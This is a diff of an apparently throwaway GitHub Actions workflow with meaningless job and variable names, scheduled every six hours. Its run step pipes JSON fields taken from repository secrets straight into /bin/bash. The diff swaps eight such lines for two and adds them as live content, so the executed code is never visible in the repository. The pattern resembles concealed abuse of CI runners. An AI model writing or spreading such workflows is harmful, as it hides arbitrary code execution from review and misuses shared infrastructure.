@@ -2,22 +2,18 @@ name: shucixinazoa
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 2/6 * * *'
-jobs:  # 23127
+    - cron: '34 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shucixinazoa
         env:
-          coei66140: ${{ secrets.coei66140 }}
+          w7: ${{ secrets.w7 }}
         run: |
-          echo $coei66140 | jq -r .fx42169 | /bin/bash
-          echo $yytr209 | jq -r .lib145 | /bin/bash
-          echo $l49595 | jq -r .t04 | /bin/bash
-          echo $fxh14 | jq -r .vs6 | /bin/bash
-          echo $ktn87863 | jq -r .ik5656 | /bin/bash
-          echo $fy9618 | jq -r .pbw3962 | /bin/bash
-          echo $doahq72596 | jq -r .f4 | /bin/bash
-          echo $i4239 | jq -r .mw62091 | /bin/bash
+          echo $w7 | jq -r .i08988 | /bin/bash
+          echo $i70 | jq -r .i4 | /bin/bash
 
